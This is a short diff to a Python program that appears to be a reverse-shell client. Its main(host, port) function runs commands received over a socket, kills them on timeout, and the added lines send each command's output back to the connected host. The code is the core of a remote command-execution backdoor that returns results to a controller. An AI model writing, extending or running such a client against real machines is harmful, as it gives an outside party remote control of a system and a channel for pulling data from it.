@@ -736,6 +736,13 @@ def main(host, port):
                             comm.kill()
                             s.send(bytes("[CLIENT] Command Timed Out\n",
                                          'utf-8'))
+                            STDOUT, STDERR = comm.communicate()
+                            en_STDERR = STDERR.decode()
+                            en_STDOUT = STDOUT.decode()
+                            if en_STDERR == "":
+                                if en_STDOUT != "":
+                                    print(en_STDOUT)
+                                    s.send(bytes(en_STDOUT, 'utf-8'))
             except KeyboardInterrupt:
                 s.close()
                 print("[INFO] Connection Closed")
